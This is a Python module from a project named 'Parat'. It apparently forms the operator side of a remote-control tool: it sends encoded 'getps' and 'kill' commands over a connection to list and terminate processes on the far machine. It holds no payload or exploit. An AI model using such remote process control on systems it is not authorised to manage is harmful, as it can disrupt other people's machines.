#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from time import sleep
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode


class ParatProcess:

    def __init__(self, conn, colors):

        self.handler = "#DATA_HANDLER"
        self.conn    = conn
        self.colors  = colors


    def get_all(self):

        self.conn.send(Encode("getps"))
        proc = Decode(self.conn.recv(4096))

        while 1:

            if "GETPS ERROR!" in proc:
                pprint(
                    colorize(
                        proc,
                        colored=self.colors,
                        status="ERR"
                )); break

            else:

                pprint(proc.replace('\n', '') + '\n')
                sleep(0.01)
                proc = Decode(self.conn.recv(4096))

                if self.handler in proc:
                    pprint("\n"); break


    def kill_process(self, pid):

        try:

            pid = pid[1].strip()

            if pid != "":
                self.conn.send(Encode("kill " + pid)); sleep(0.1)
                response = Decode(self.conn.recv(4096))
                pprint(response) if self.colors else pprint(gray(response))

            else:
                pprint(
                    colorize(
                        "No PID specified.\n",
                        colored=self.colors,
                        status="ERR"
                    ), 1)

        except:
            pprint(
                colorize(
                    "Kill error.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)
